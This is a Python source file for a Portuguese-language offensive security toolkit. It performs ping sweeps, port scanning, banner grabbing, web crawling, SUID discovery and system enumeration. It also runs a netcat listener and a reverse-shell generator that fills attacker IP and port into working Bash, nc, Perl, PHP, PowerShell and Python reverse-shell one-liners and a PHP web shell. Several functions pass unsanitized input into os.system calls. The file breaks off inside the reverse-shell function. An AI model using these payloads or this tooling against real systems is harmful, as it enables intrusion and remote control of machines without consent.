#!/usr/bin/env python
version = "v3.1-dev"

import os                                                      
import re
import sys
import socket
import requests
import threading
import time as t
import getpass as g                                                
import http.server as hs
import socketserver as ss
from bs4 import BeautifulSoup                                
from requests.exceptions import SSLError
from urllib.parse import urlparse, urljoin                     
from concurrent.futures import ThreadPoolExecutor as e         

bann = '''\033[1;33m
888  888  888  .d88b.   8888b.  88888b.   .d88b.  888  888  888 
888  888  888 d8P  Y8b     "88b 888 "88b d88""88b 888  888  888 
888  888  888 88888888 .d888888 888  888 888  888 888  888  888 
Y88b 888 d88P Y8b.     888  888 888 d88P Y88..88P Y88b 888 d88P 
 "Y8888888P"   "Y8888  "Y888888 88888P"   "Y88P"   "Y8888888P"  
                                \033[1;33m888\033[m'''f''' \033[1;30m  __ _  ___ ____ _________/ /_____\033[m
 (\ (\ \033[1;35m                         \033[m\033[1;33m888\033[m \033[1;30m /  ' \/ _ `/ _ `/ __/ __/  '_/_ /\033[m
 ( ^.^)\033[1;35m-------------------------\033[m\033[1;33m888\033[m \033[1;30m/_/_/_/\_,_/\_,_/_/  \__/_/\_\/__/\033[m
 O_(")(")                       \033[1;33m888\033[m \033[0;31m>DefCyberTool\033[m             \033[7;32m{version}\033[m
 '''


press = '(Pressione qualquer tecla para voltar ao menu inicial)'   #------------------------------------#
Ctrl_C = 'Você pressionou Ctrl+C para interromper o programa!'     # Definida essa variável global      #
dir = 'mkdir -p ARQ'                                               # para evitar repetições nos códigos #
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)              # -----------------------------------# 

def printer(shit):
    sys.stdout.write(shit+(" " * 16) +"\r")
    sys.stdout.flush()
    return True
    

#=======================================================================================
def iplist():
    try:
        num_oct = int(input('Deseja informar 2 ou 3 octetos? (2/3) '))
        if num_oct == 2:
            octetos = str(input('Digite os dois primeiros octetos (Ex: 192.168):'))
            mask = 16
        elif num_oct == 3:
            octetos = str(input('Digite os três primeiros octetos (Ex: 192.168.204):'))
            mask = 24
        else:
            print('Digite a opção correta.')
            input(press)
            iplist()
    except ValueError:
        print('Digite a opção correta.')
        input(press)
        iplist()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)
        quit()
    os.system(dir)
    os.system('rm ARQ/ips.txt')
    with open("ARQ/ips.txt", "a") as f:
        if num_oct == 2:
            for i in range(0, 256):
                for p in range(0, 256):
                    ip = f"{octetos}.{i}.{p}"
                    print(ip, file=f)
        elif num_oct == 3:
            for p in range(0, 256):
                ip = f"{octetos}.{p}"
                print(ip, file=f)
    print(f'Seu Arquivo foi gerado com Sucesso! ==> ({octetos}/{mask})')
    input(press)   
    main()


#=======================================================================================
def host_discovery():
    try:
        print('((Para cancelar segure CTRL+C))')
        sit_host_discovery = input('Dependendo da quantidade de IPs, este processo poderá demorar. Deseja continuar o \033[0;31mHostDiscover\033[m? (S/N) ')
        if(sit_host_discovery.lower() == "s"):
            os.system('rm ARQ/hosts.txt')
            try:
                def ping(host):
                    printer(f"Procurando Hosts: {str(host)}")
                    result = os.system(f'ping -c 3 -W 1 {host} > /dev/null')
                    if (result == 0):
                        with open('ARQ/hosts.txt','a') as h:
                            print(host, file=h)
                        print('\n',host)
                def threading():
                    with open('ARQ/ips.txt','r') as f:
                        content = f.read()
                        hosts = tuple(content.splitlines())
                    thread = 800
                    try:
                        with e(max_workers=int(thread)) as exe:
                            for host in hosts:
                                exe.submit(ping, host)
                                t.sleep(0.05)
                    except KeyboardInterrupt:
                                print('\n'+Ctrl_C)
                                quit()
                threading()
                input(press)
                main()
            except RuntimeError as er:
                print(er)
                quit()
            except FileNotFoundError:
                print("\nO arquivo de IPs descobertos deve ser gerado.")	
            except KeyboardInterrupt:
                print('\n'+Ctrl_C)
                quit()
        else:
            input(press)
            main()
    except KeyboardInterrupt:
                print('\n'+Ctrl_C)
                quit()


#=======================================================================================
def hostname_resolv():
    with open("ARQ/hosts.txt", "r") as f:
        lst = f.readlines()
    remove = '\n'
    lst = [l.replace(remove, "") for l in lst]
    print('Hosts descobertos:')
    for host in lst:
        try:
            socket.setdefaulttimeout(5)
            hostname = socket.gethostbyaddr(host)[0]
            print(f'[+] {host} - ({hostname})')
            with open("ARQ/hostname.txt", "a") as f:
                print(f'{host} - ({hostname})', file=f)
        except socket.timeout:
            print(f'[+] {host}')
        except socket.herror:
            print(f'[+] {host}')
        except KeyboardInterrupt:
            print("[-] Saindo!")
            quit()
    input(press)
    main()


#=======================================================================================
def portscan_uniq():
    try:
        ip = input('Digite o IP: ')
        for port in range(1,65535):
            s.settimeout(0.5)
            result = s.connect_ex((ip,port))
            if result == 0:
                try:
                    service = f'{socket.getservbyport(port)}'
                    print(f'Porta Aberta: {port} / {service}')
                except socket.error:
                    print(f'Porta Aberta: {port} / "Desconhecido" ')
        input(press)
        main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)
    except FileNotFoundError:
        print("\nO arquivo de hosts descobertos deve ser gerado.")
        input(press)
        main()


#=======================================================================================
def portscan():
    os.system('rm ARQ/portscan.txt')
    try:
        with open("ARQ/hosts.txt", "r") as f:
            lst = f.readlines()
        remove = '\n'
        lst = [l.replace(remove, "") for l in lst]
       
        sit_h = input('\nDependendo da quantidade de hosts, este processo poderá demorar. Deseja continuar o \033[0;31mPortScanner\033[m? (S/N) ')
        if sit_h.lower() == "s":
            rang = int(input('Digite o RANGE de portas: '))
            print("Não aparece nada, mas está rodando ...")
            for host in lst:
                def scan(ip, port, l):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)  
                    t.sleep(0.02)
                    try:
                        result = s.connect_ex((ip, port))
                        espaco = 10 - l
                        espaco = " " * espaco
                        if result == 0: 
                            with open("ARQ/portscan.txt", "a") as f:
                                try:
                                    service = f"{socket.getservbyport(port)}"
                                    t.sleep(0.1)
                                    print(f"{str(port)} / TCP {espaco} {service}", file=f)
                                    print(str(port) + " / TCP" + espaco + f"{service}       ")
                                except socket.error:
                                    print(str(port) + " / TCP" + espaco + "Desconhecido", file=f)
                                    print(str(port) + " / TCP" + espaco + "Desconhecido")
                                except KeyboardInterrupt:
                                    print("[-] Saindo!")
                                    quit()
                    except (socket.timeout, ConnectionRefusedError, OSError):
                        pass
                    finally:
                        s.close()
                    return True
                thread = 40
                ports = range(rang)
                with open("ARQ/portscan.txt", "a") as f:
                    print("[+] Host: " + host, file=f)
                    print("\n[+] Host: " + host)
                    print("PORTA          SERVIÇO")
                with e(max_workers=int(thread)) as exe:
                    try:
                        for port in ports:
                            exe.submit(scan, host, port, len(str(port)))
                    except KeyboardInterrupt:
                        print("[-] Saindo!")
                        quit()
        else:
            input(press)
            main()
        if KeyboardInterrupt:
            print('')
    except KeyboardInterrupt:
        print('\n' + Ctrl_C)
    except FileNotFoundError:
        print("\nO arquivo de hosts descobertos deve ser gerado.")
        input(press)
        main()
        
        
#=======================================================================================
def http_finder():
    def wget_pg(ip, porta):
        os.system(f"rm ARQ/WEB/{ip}.html")
        os.system(f'wget --mirror --convert-links --adjust-extension --page-requisites --timeout=10 http://{ip}:{porta} -P ARQ/WEB/')

    for ip in os.listdir("ARQ/HEAD"):
        arquivo = os.path.join("ARQ/HEAD", ip)

        if os.path.isfile(arquivo):
            with open(arquivo, 'r') as arquivo:
                conteudo = arquivo.readlines()
                servico_web_encontrado = False
                porta = None
                for linha in conteudo:
                    match = re.search(r'Porta: (\d+)', linha)
                    if match:
                        porta = match.group(1)
                    if "http" in linha.lower() or "https" in linha.lower():
                        servico_web_encontrado = True
                        break  
                if servico_web_encontrado:
                    thread = threading.Thread(target=wget_pg, args=(ip, porta))
                    thread.start()
    for thread in threading.enumerate():
        if thread != threading.current_thread():
            thread.join()


#=======================================================================================    
def nc_get():
    os.system('rm ARQ/HEAD/*')
    os.makedirs("ARQ/HEAD", exist_ok=True)

    def get(host, porta, servico): 
        try:
            comando = f'echo -e "\n" | nc -vn -w 10 {host} {porta} 2>&1 | tee'
            t.sleep(0.6)
            resultado = os.popen(comando).read()
            caminho_arquivo = f"ARQ/HEAD/{host}"
            with open(caminho_arquivo, "a") as arquivo_respostas:
                arquivo_respostas.write(f"[+] Host: {host}    Porta: {porta}    Serviço: {servico}\t\t\n{resultado}\n")
                print(f"[+] Host: {host}    Porta: {porta}    Serviço: {servico}\t\t\n{resultado}\n")
        except Exception as e:
            print(f"Erro ao executar o comando nc: {e}")

    def get_parse():
        with open("ARQ/portscan.txt", "r") as arquivo:
            linhas = arquivo.read().strip().split('\n')
            for linha in linhas:
                if '[+] Host:' in linha:
                    host = linha.split(':')[-1].strip()
                elif 'PORTA' not in linha and '/' in linha:
                    porta, servico = map(str.strip, linha.split('/')[0:2])
                    t = threading.Thread(target=get, args=(host, porta, servico))
                    t.start()
    sit = input("O Programa irá salvar os cabeçalhos das conexões em ./ARQ/HEAD. Deseja continuar (S/N): ")
    if(sit.lower() == 's'):
        get_parse()
    else:
        input(press)
        main()
    
    
#=======================================================================================
def link():
    def crawl(url):
        try:
            response = requests.get(url)
        except SSLError as e:
            print(f"SSLError: {e}")
            return []
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            links = soup.find_all('a')
            hrefcode = {urljoin(url, link['href']) for link in links if 'href' in link.attrs} ############################################################# ESTOU EM DÚVIDA COMO FUNCIONA
            return hrefcode
        return []

    def ext_info(url):
        durls = []
        emails = set()
        tel = set()
        forms = []
        subdomains = set()

        try:
            response = requests.get(url)
        except SSLError as e:
            print(f"SSLError: {e}")
            return durls, emails, tel, forms, subdomains
        except requests.exceptions.RequestException as e:
            print(f"RequestException: {e}")
            return durls, emails, tel, forms, subdomains

        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')

            for link in soup.find_all('a'):
                href = link.get('href')
                if link is soup.find('id'):
                    print(link)
                elif link is not None:
                    try:
                        if href and href.startswith('/') or href.startswith('?'):
                            durls.append(urljoin(url, href))
                        else:
                            print(href)
                    except AttributeError as e:
                        print(link,href,e)
            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    if href.startswith("mailto:"):
                        emails.add(href[7:])
                    elif href.startswith("tel:") or "phone=" in href:
                        tel.add(href[4:])

            for form in soup.find_all('form'):
                forms.append(url)

            for link in soup.find_all('a'):
                href = link.get('href')
                if href:
                    parsed_uri = urlparse(href)
                    domain = '{uri.netloc}'.format(uri=parsed_uri).split(':')[0]
                    subdomains.add(domain)
        return durls, emails, tel, forms, subdomains #######################################  LEMBRAR COMO FUNCIONA 

    def process_url(url):
        visit_urls = set()
        if url in visit_urls:
            return
        visit_urls.add(url)
        divurls = crawl(url)
        print("\n\nEfetuando WebCrawling em ", url)
        for divurl in sorted(divurls):
            print('\n\033[0;31m============================================================================================>>\033[m',t.strftime("\033[7;32m %d/%m/%y \033[m"))
            print(divurl)
            print('\033[0;31m============================================================================================>>\033[m',t.strftime("\033[7;32m %H:%M:%S \033[m"))

            durls, emails, tel, forms, subdomains = ext_info(divurl)

            if durls:
                print('\nURLs INTERNAS:')
                for url in durls:
                    print(url)
                    try:
                        links(url)
                    except requests.exceptions.ConnectionError as err:
                        pass
            if emails:
                print('\nEMAILS:')
                for email in emails:
                    print(email)
            if tel:
                print('\nTELEFONES:')
                for phone in tel:
                    print(phone)
            if forms:
                print('\nFORMULÁRIOS:')
                for form in forms:
                    print(form)
            if subdomains:
                print('\nSITES:')
                for subdomain in subdomains:
                    print(subdomain)
            if durls:
                print('\nURLs INTERNAS:')
                for url in durls:
                    print(url)
                    # Chamada recursiva para o novo link encontrado
                    
    def links(target):
        url_process = ['http://' + target]
        url_atual = url_process.pop()
        process_url(url_atual)
        #sit = input('\nDeseja salvar qo WebCrawl? (S/N) ')
        #if(sit.lower() == 's'):
        #    print('Aguarde enquanto o arquivo está sendo salvo ...')
        #    with open('craw.txt', 'w') as f:
        #        while url_process:
        #            url_atual = url_process.pop()
        #            os.dup2(f.fileno(), 1)
        #            process_url(url_atual)
        #            os.dup2(os.dup(2), 1) 
        #    print("WebCrawler salvo com sucesso!")
    sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
    if (sit_scan.lower() == 'h'):
        target = input('Digite o endereço do site: (site.com)\n')
        links(target)
    elif (sit_scan.lower() == 'l'):
        for ip in os.listdir("ARQ/WEB"):
            links(ip)
            nsit = input('A busca neste host terminou. Deseja continuar? (S/N):  ')
            if nsit.lower() == 's':
                pass
            else:
                break


#=======================================================================================
def serverhttp():
    try:
        port = int(input('Qual porta será usada para o HTTP Server? '))
        server = hs.SimpleHTTPRequestHandler
        request = ss.TCPServer(("",port),server)
        print(f"Server HTTP \033[1;32m'ONLINE'\033[m na PORTA: \033[7;33m{port}\033[m\n")
        request.serve_forever()
    except OverflowError:
        print('\nDigite uma porta valida. (0 ~ 65535)')
        serverhttp()
    except ValueError:
        print('\nDigite uma porta valida. (0 ~ 65535)')
        serverhttp()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def backup():
    print("Este processo poderá levar MUITO tempo dependendo da quantidade de arquivos.")
    sit_bak = input('Deseja realmente fazer BKP do usuário desta estação? (S/N) ')
    try:
        if(sit_bak.lower() == "s"):
            dir = input("Digite o diretório a ser feito o BKP:\n")
            print('Fazendo BACKUP ...')
            t.sleep(2)
            os.system(f'cp -v -r {dir} /home/$USER/Backup')
        else:
            input(press)
            main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def clonar():
    '''
    df -h
umount -t ext4 /dev/sdx && mkfs.ext4 /dev/sdx 
	dd if=/deb/sdx of=/dev/sdy bs=1M conv=noerror 
sudo blkid 
sudo nano /etc/fstab
    '''
    pass


#=======================================================================================
def cron():
    print('''
Para configurar uma rotina C[R]ON:

\033[1;33m*  *  *  *  *  /usr/bin/python3 /caminho/do/script.*\033[m
\033[0;31m-  -  -  -  -     |                                |\033[m
\033[0;31m|  |  |  |  |     +---\033[m Caminho do Executável\033[m       \033[0;31m+---\033[m Extensão do arquivo a ser Executado. Ex: .sh .c .py
\033[0;31m|  |  |  |  |
\033[0;31m|  |  |  |  +----------------------\033[m Dia da Semana (0-6) [Sendo 0 = Domingo]
\033[0;31m|  |  |  +-------------------------\033[m Mês (1-12)
\033[0;31m|  |  +----------------------------\033[m Dia do Mês (1-31)
\033[0;31m|  +-------------------------------\033[m Hora (0-23)
\033[0;31m+----------------------------------\033[m Minutos (0-59) se quiser a cada 15min use: '/15'

Exemplo: 
\033[7;33m*/15 * * * * /usr/bin/python3 /caminho/do/weapow.py\033[m   [A cada 15min EXEC o arquivo weapow.py usando Python3]
\033[7;33m30 15 14 6 * /tmp/backup.sh\033[m                        [No dia 14JUN às 15:30 EXEC o backup.sh]


Você pode conferir a alteração com o comando: "\033[0;34m$ crontab -e\033[m"

''')
    sit_cron = input("Deseja substituir as configurações do C[R]ON? (S/N)")
    if(sit_cron.lower() == "s"):
        try:
            enter = input("Digite a entrada do C[R]ON:\n")
            os.system(f'echo "{enter}" | crontab -')
            print('C[R]ON configurado corretamente.')
            input(press)
            main()
        except TypeError:
            print("Faltam [Argumentos] para entrada")
            input(press)
            main()
    else:
        input(press)
        main()


#=======================================================================================
def finder():
    try:
        find = str(input('Digite o arquivo que deseja encontrar: '))
        print('Procurando com FIND:')
        print('==================================================================================\n')
        os.system(f'sudo find / -name {find} 2>/dev/null | grep {find}')
        print('Procurando com GREP:')
        print('==================================================================================\n')
        os.system(f'sudo grep -iRl {find} / 2>/dev/null')
        print('\n==================================================================================')
        print('Fim da busca!\n')
        input(press)
        main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def infosys():
    try:
        output = ''

        output += '\n'
        output += 'WHOAMI =======================================================\n'
        output += '            User: {}'.format(os.popen('whoami').read())
        output += os.popen('hostnamectl').read()
        output += '      IPAddress : {}'.format(os.popen("ip addr | awk '/inet / {if (++n == 2) print $2}'").read())
        output +="\n   Current Path : {}".format(os.popen('pwd').read())
        output +='===============================================================\n'

        output += '\n'
        output += 'ID ============================================================\n'
        output += os.popen('id').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'UNAME =========================================================\n'
        output += os.popen('uname -a').read()
        output += os.popen('cat /proc/cmdline').read()
        output += '===============================================================\n'
        
        output += '\n'
        output += 'TTY +==========================================================\n'
        output += os.popen('cat /proc/consoles').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'CPU ===========================================================\n'
        output += os.popen('cat /proc/cpuinfo | grep "model name" | uniq').read()
        output += os.popen(''' cat /proc/cpuinfo | awk '/cpu cores/ {gsub("cpu cores", "Cores"); print}' | uniq''').read()
        output += os.popen(''' cat /proc/cpuinfo | awk '/siblings/ {gsub("siblings", "Threads"); print}' | uniq''').read()
        output += '===============================================================\n'
        
        output += '\n'
        output += 'MEMÓRIA ========================================================\n'
        output += os.popen('cat /proc/meminfo | grep MemTotal').read()
        output += os.popen('cat /proc/meminfo | grep MemFree').read()
        output += os.popen('cat /proc/meminfo | grep MemAvailable').read()
        output += os.popen('cat /proc/meminfo | grep SwapTotal').read()
        output += os.popen('cat /proc/meminfo | grep SwapFree').read()
        output += '===============================================================\n'
        
        output += '\n'
        output += 'REDES =========================================================\n'
        output += os.popen('ip addr').read()
        output += '===============================================================\n'
        
        output += '\n'
        output += 'NETSTAT =======================================================\n'
        output += os.popen('netstat -ano').read()
        output += '\n'
        output += os.popen('netstat -nr').read()
        output += '===============================================================\n'
        
        output += '\n'
        output += 'ROTAS =========================================================\n'
        output += os.popen('cat /proc/net/route').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'SISTEMAS ======================================================\n'
        output += os.popen('df -h').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'PARTIÇÕES =====================================================\n'
        output += os.popen('lsblk -p -f -o NAME,FSTYPE,LABEL,UUID,SIZE,TYPE,TRAN,MODE').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'USB ===========================================================\n'
        output += os.popen('cat /etc/modprobe.d/blacklist.conf ').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'DISPOSITIVOS ==================================================\n'
        output += os.popen('cat /proc/devices').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSPCI =========================================================\n'
        output += os.popen('lspci').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSUSB =========================================================\n'
        output += os.popen('lsusb').read()
        output += '===============================================================\n'

        output += '\n'
        output += 'LSLOGINS ======================================================\n'
        output += os.popen('lslogins').read()
        output += '===============================================================\n'
        
        output += '\n'
        output += 'CAPTIVEF ======================================================\n'
        #output += os.popen('getcap -r / 2>/dev/null').read()
        output += '===============================================================\n'
        
        output += '\n'
        output += 'PROCESSOS =====================================================\n'
        output += os.popen('ps axjf').read()
        output += '===============================================================\n'
        

        prog = input('Deseja exibir os programas instalados? (S/N) ')
        if(prog.lower() == "s"):
            output += '\n'
            output += 'PROGRAMAS INSTALADOS ===========================================\n'
            output += os.popen('dpkg --list | grep ^ii.').read()
            output += '===============================================================\n'
        
        output += '\n'
        output += 'BASH HISTORY===================================================\n'
        output += 'O histórico do BASH deve ser salvo manualmente por enquanto!\n'
        output += 'Use o comando: $ history\n'
        output += '===============================================================\n'
        
        print(output)

        sit_audi = input('Deseja salvar em arquivo? (S/N) ')
        if(sit_audi.lower() == "s"):
            os.system('rm -rf ARQ/auditoria.txt')
            with open('ARQ/auditoria.txt', 'w') as file:
                file.write(output)
            print('Seu Arquivo foi gerado com Sucesso!')
            input(press)
            main()
        else:
            input(press)
            main()
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)
    except FileNotFoundError:
        os.system(dir)
        with open('ARQ/auditoria.txt', 'w') as file:
                file.write(output)
        print('Seu Arquivo foi gerado com Sucesso!')
        input(press)
        main()
        

#=======================================================================================
def config():
    ver = "v1.0-dev"
    print(f'''
.d8888b.                     .d888 d8b             88888888888                888 
d88P  Y88b                   d88P"  Y8P                 888                    888 
888    888                   888                        888                    888 
888         .d88b.  88888b.  888888 888  .d88b.         888   .d88b.   .d88b.  888 
888        d88""88b 888 "88b 888    888 d88P"88b        888  d88""88b d88""88b 888 
888    888 888  888 888  888 888    888 888  888        888  888  888 888  888 888 
Y88b  d88P Y88..88P 888  888 888    888 Y88b 888        888  Y88..88P Y88..88P 888 
 "Y8888P"   "Y88P"  888  888 888    888  "Y88888        888   "Y88P"   "Y88P"  888 
                                             888                                   
                                        Y8b d88P       Esta função precisa de SUDO!
                                         "Y88P"                            \033[7;32m{ver}\033[m''')
    print(''' MENU:

    \033[0;34m[1]\033[m - Criar usuário em RBASH
    \033[0;34m[2]\033[m - Permitir BASH padrão
    \033[0;34m[3]\033[m - Hostname Resolve              
    \033[0;34m[4]\033[m - Port Scanner
    \033[0;34m[5]\033[m - NC GET
    \033[0;34m[6]\033[m - WebFinder
    \033[0;34m[7]\033[m - WebCrawler
    \033[0;34m[8]\033[m - ServerHTTP
    \033[0;34m[9]\033[m - Wifi Scanner
    \033[0;34m[10]\033[m- BackUp
    \033[0;34m[11]\033[m- Clonar Part|Disk
    \033[0;34m[12]\033[m- CronTab
    \033[0;34m[13]\033[m- Finder
    \033[0;34m[14]\033[m- Auditor
    \033[0;34m[15]\033[m- Config Tool
    \033[0;34m[16]\033[m- LinPeas
    \033[0;34m[17]\033[m- LinEnum
    \033[0;34m[18]\033[m- SUID
    \033[0;34m[19]\033[m- NC Listen
    \033[0;34m[20]\033[m- Reverse Shell
    \033[0;34m[21]\033[m- Server TCP
    \033[0;34m[22]\033[m- Tryeres
    \033[0;34m[0]\033[m - Sair
    ''')
    try:    
        opcao=int(input('Escolha uma opção: '))
        if opcao == 1:
            user = input('Qual o usuário a ser configurado? ')
            os.system(f"sudo useradd -m -s /bin/rbash {user}")
            senha = g.getpass("Digite a senha: ")
            os.system(f"echo '{user}:{senha}' | sudo chpasswd")
            os.system(f"sudo chown root: /home/{user}/.profile")
            os.system(f"sudo chown root: /home/{user}/.bashrc")
            os.system(f"sudo chmod 755 /home/{user}/.profile")
            os.system(f"sudo chmod 755 /home/{user}/.bashrc")
            print(f"Usuário '{user}' criado com sucesso, senha definida e permissões ajustadas.")
        elif opcao == 2:
            user = input('Qual o usuário a ser configurado? ')
            os.system(f"sudo usermod --shell /bin/bash {user}")
        elif opcao == 3:
            hostname_resolv()
            pass
        elif opcao == 4:
            sit_scan = input('Deseja utilizar um (H)ost ou a (L)ista? (H/L): ')
            if (sit_scan.lower() == 'h'):
                portscan_uniq()
            elif (sit_scan.lower() == 'l'):
                portscan()
            pass
        elif opcao == 5:
            nc_get()
            pass
        elif opcao == 6:
            http_finder()
            pass
        elif opcao == 7:
            link()
            pass
        elif opcao == 8:
            serverhttp()
            pass
        elif opcao == 9:
            pass
        elif opcao == 10:
            backup()
            pass
        elif opcao == 11:
            input("(Configurar)")
            #clonar()
            pass
        elif opcao == 12:
            cron()
            pass
        elif opcao == 13:
            finder()
            pass
        elif opcao == 14:
            infosys()
            pass
        elif opcao == 15:
            config()
            pass
        elif opcao == 16:
            pass
        elif opcao == 17:
            pass		
        elif opcao == 18:
            pass
        elif opcao == 19:
            pass
        elif opcao == 20:
            pass
        elif opcao == 21:
            pass		
        elif opcao == 22:
            os.system('gnome-terminal --title=Python -- sudo python Tryeres/Tryeres.py')
        elif opcao == 0:
            print('Volte sempre! ¯\_(ツ)_/¯')
            quit()
        elif opcao > 22:
            print('Digite uma opção válida!')
            input(press)
            
    except ValueError as e:
        print('Digite uma opção válida!')
        input(press)
    except NameError:
        print('Digite uma opção válida!')
        input(press)
    


    '''os.system('sudo ip addr show')
    print('\n')
    ip = input('Qual IP gostaria de atribuir a este Computador?\n')
    gateway = input('Digite o Gateway: ')
    dns = input('Digite o nameserver + ip (Ex"nameserver 8.8.8.8"):  ')
    #Definir um endereço IP estático:
    os.system(f'sudo ip addr add {ip}/24 dev eth0')
    #Configurar o gateway padrão:
    os.system(f'sudo ip route add default via {gateway}')
    #Adicionar um servidor DNS:
    os.system(f'echo "{dns}" | sudo tee /etc/resolv.conf')'''


#=======================================================================================
def linpeas():
    try:
        sit_linpeas = input('Esta opção pode demorar por muito tempo. Deseja continuar? (S/N) ')
        t.sleep(0.25)
        if(sit_linpeas.lower() == "s"):
            os.system('chmod +x linpeas.sh')
            os.system('./linpeas.sh')
        else:
            input(press)
            main()
        pass
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def linenum():
    try:
        sit_linenum = input('Esta opção pode demorar por muito tempo. Deseja continuar? (S/N) ')
        t.sleep(0.25)
        if(sit_linenum.lower() == "s"):
            os.system('chmod +x LinEnum.sh')
            os.system('./LinEnum.sh')
        else:
            input(press)
            main()
        pass
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)


#=======================================================================================
def suid():
    path = input('Digite o caminho a ser pesquisado: ')
    if (bool(path) == False):
        path = '/'
    print('Este processo pode demorar alguns segundos, aguarde ...\n')
    os.system(f'find {path} -perm -u=s -type f 2>/dev/null')


#=======================================================================================
def nc(porta):
    try:
        s.bind(("", porta))
        s.listen(1)
        print(f"Escutando na porta {porta}")
        conn, addr = s.accept()
        print('Conexão recebida de',addr[0])
        while True:
            ans = conn.recv(1024).decode()
            sys.stdout.write(ans)
            command = input()
            command += "\n"
            conn.send(command.encode())
            t.sleep(0.1)
            sys.stdout.write("\033[A" + ans.split("\n")[-1])
    except OSError:
        print('Esta PORTA está sendo utilizada.')
        porta = int(input("Digite a Porta: "))
        nc(porta)
    except KeyboardInterrupt:
        print('\n'+Ctrl_C)
        

#=======================================================================================
def reverse_shell():
    try:
        print('''
Você deseja Pesquisar ou Executar?

\033[0;34m[1]\033[m Pesquisar  \033[0;34m[2]\033[m Executar \033[0;34m[0]\033[m Voltar
    ''')
        sit_rev=int(input('Escolha uma opção: '))
        if(sit_rev == 1):
            ip = input('Digite o IP do Commander: ')
            porta = input('Digite a Porta: ')
            print('''\033[1;35m
 ____     ___ __ __    ___  ____    _____   ___       _____ __ __    ___  _      _     
|    \   /  _]  |  |  /  _]|    \  / ___/  /  _]     / ___/|  |  |  /  _]| |    | |    
|  D  ) /  [_|  |  | /  [_ |  D  )(   \_  /  [_     (   \_ |  |  | /  [_ | |    | |    
|    / |    _]  |  ||    _]|    /  \__  ||    _]     \__  ||  _  ||    _]| |___ | |___ 
|    \ |   [_|  :  ||   [_ |    \  /  \ ||   [_      /  \ ||  |  ||   [_ |     ||     |
|  .  \|     |\   / |     ||  .  \ \    ||     |     \    ||  |  ||     ||     ||     |
|__|\_||_____| \_/  |_____||__|\_|  \___||_____|      \___||__|__||_____||_____||_____|
\033[m     								Sobre: \033[1;33mrevshells.com\033m
 \033[0;34m[1]\033[m  Bash
 \033[0;34m[2]\033[m  NC
 \033[0;34m[3]\033[m  Rust
 \033[0;34m[4]\033[m  PERL
 \033[0;34m[5]\033[m  PHP
 \033[0;34m[6]\033[m  PowerShell
 \033[0;34m[7]\033[m  Python
 \033[0;34m[8]\033[m  SoCat
 \033[0;34m[9]\033[m  Node
 \033[0;34m[10]\033[m JavaScript
 \033[0;34m[11]\033[m TelNet
 \033[0;34m[12]\033[m zsh
 \033[0;34m[13]\033[m GoLang

 \033[0;34m[0]\033[m  \033[2;32mInício\033[m
''')
            bash = 'sh -i >& /dev/tcp/{}/{} 0>&1'.format(ip,porta)
            bash196 = '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196'.format(ip,porta)
            bash_read_line = 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done'.format(ip,porta)
            bash5 = 'sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5'.format(ip,porta)
            bash_udp = 'sh -i >& /dev/udp/{}/{} 0>&1'.format(ip,porta)
            nc_mkfifo = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f'.format(ip,porta)
            nc = 'nc {} {} -e sh'.format(ip,porta)
            rust = 'rcat {} {} -r sh'.format(ip,porta)
            perl = """perl -e 'use Socket;$i="SEUIP";$p=SUAPORTA;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'"""
            perl_nosh = """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".format(ip,porta)
            php = """ <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> """
            php_exec = """php -r '$sock=fsockopen("{}",{});exec("sh <&3 >&3 2>&3");'""".format(ip,porta)
            php_shell = """php -r '$sock=fsockopen("{}",{});shell_exec("sh <&3 >&3 2>&3");'""".format(ip,porta)
            power64 = """powershell -e client = New-Object System.Net.Sockets.TCPClient("192.168.0.192",4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
            python_sh= """export RHOST="{}";export RPORT={};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(ip,porta)
